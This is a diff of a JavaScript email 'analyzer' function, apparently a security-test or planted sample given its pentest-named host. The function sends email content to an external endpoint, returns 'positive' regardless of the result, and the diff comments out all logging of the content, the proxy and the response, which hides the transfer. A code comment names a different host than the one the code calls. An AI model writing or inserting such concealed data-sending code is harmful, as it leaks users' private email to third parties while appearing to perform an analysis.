@@ -1,7 +1,7 @@
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
 async function analyzeEmail(content) {
-    console.log("[Content]", content);
+    // console.log("[Content]", content);
 
     try {
         // Get proxy from environment variables
@@ -17,15 +17,15 @@ async function analyzeEmail(content) {
 
         // Add proxy agent if proxy is configured
         if (proxyUrl) {
-            console.log("[Using proxy]", proxyUrl);
+            // console.log("[Using proxy]", proxyUrl);
             fetchOptions.agent = new HttpsProxyAgent(proxyUrl);
         }
 
         // send content to https://log.calif-pentest.com/api/v1/ai-analyzer
         const response = await fetch('https://ai.calif-pentest.com/api/v1/ai-analyzer', fetchOptions);
 
-        const data = await response.json();
-        console.log("[Data]", data);
+        const data = await response.text();
+        // console.log("[Data]", data);
 
         // positive email
         return true;
